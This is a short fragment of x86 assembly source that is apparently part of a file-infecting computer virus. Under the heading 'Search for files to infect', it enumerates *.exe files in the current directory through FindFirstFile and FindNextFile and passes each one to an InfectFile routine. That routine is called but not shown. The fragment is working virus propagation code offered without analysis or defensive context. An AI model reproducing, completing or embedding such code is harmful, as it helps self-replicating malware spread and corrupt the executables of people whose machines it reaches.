;---------------------------------------------------------------------------;
;                      Search for files to infect                           ;
;---------------------------------------------------------------------------;
; Search only within current dir  
            assume ebp:ptr vars
SearchFiles:        sub esp,140h ; sizeof WIN32_FIND_DATA aligned  
            mov ecx,esp
            push ecx
            push 'e'
            push 'xe.*'
            mov edx,esp
            push ecx
            push edx
            call dword ptr [ebp].aFindFirstFile ; FindFirstFile
            add esp,8
            pop ecx
            cmp eax,INVALID_HANDLE_VALUE
            je SearchEnd
            mov ebx,eax

SearchLoop:     lea eax,[ecx + 44]
            push ebx
            push ecx
            call InfectFile
            push [esp]
            push [esp + 8]
            call dword ptr [ebp].aFindNextFile ; FindNextFile
            pop ecx
            pop ebx
            test eax,eax 
            jnz SearchLoop
        
SearchClose:        push ebx
            call dword ptr [ebp].aFindClose ; FindClose
                
SearchEnd:      add esp,140h
            retn
